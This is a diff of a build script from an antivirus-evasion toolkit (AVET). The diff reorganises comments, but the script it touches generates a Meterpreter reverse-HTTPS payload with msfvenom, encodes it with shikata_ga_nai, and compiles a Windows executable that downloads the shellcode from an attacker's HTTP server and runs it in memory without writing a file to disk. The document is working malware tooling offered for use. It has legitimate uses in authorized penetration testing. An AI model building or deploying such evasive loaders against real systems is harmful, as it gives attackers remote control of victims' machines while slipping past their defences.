@@ -1,10 +1,10 @@
 #!/bin/bash          
-# Download the shellcode via sockets.
 
-# The generated msf payload needs to be hosted on a HTTP server
-# Call your executable like:
-# output.exe http://yourserver/thepayload.bin
-# The executable will then download, read the file into memory via sockets (no file is dropped on disk) and finally execute the downloaded shellcode.
+
+#DESCRIPTION_START
+# Download the shellcode via sockets.
+#DESCRIPTION_END
+
 
 # print AVET logo
 cat banner.txt
@@ -20,9 +20,15 @@ cat banner.txt
 # import global default lhost and lport values from build/global_connect_config.sh
 . build/global_connect_config.sh
 
+
+#CONFIGURATION_START
 # override connect-back settings here, if necessary
 LPORT=$GLOBAL_LPORT
 LHOST=$GLOBAL_LHOST
+# enable debug output
+enable_debug_print
+#CONFIGURATION_END
+
 
 # make meterpreter reverse payload, encoded with shikata_ga_nai
 msfvenom -p windows/meterpreter/reverse_https lhost=$LHOST lport=$LPORT -e x86/shikata_ga_nai -b '\x00' -f raw -a x86 --platform Windows > output/thepayload.bin
@@ -44,9 +50,6 @@ set_payload_info_source no_data
 # set shellcode binding technique
 set_payload_execution_method exec_shellcode
 
-# enable debug output
-enable_debug_print
-
 # compile to exe file
 $win32_compiler -o output/downloadsocket_revhttps_win32.exe source/avet.c -lwsock32 -lWs2_32
 strip output/downloadsocket_revhttps_win32.exe
@@ -58,3 +61,11 @@ echo "The generated msf payload needs to be hosted on a HTTP server
 Call your executable like:
 downloadsocket_revhttps_win32.exe http://yourserver/thepayload.bin
 The executable will then download, read the file into memory via sockets (no file is dropped on disk) and finally execute the downloaded shellcode."
+
+
+#USAGE_START
+# The generated msf payload needs to be hosted on a HTTP server
+# Call your executable like:
+# downloadsocket_revhttps_win32.exe http://yourserver/thepayload.bin
+# The executable will then download, read the file into memory via sockets (no file is dropped on disk) and finally execute the downloaded shellcode.
+#USAGE_END
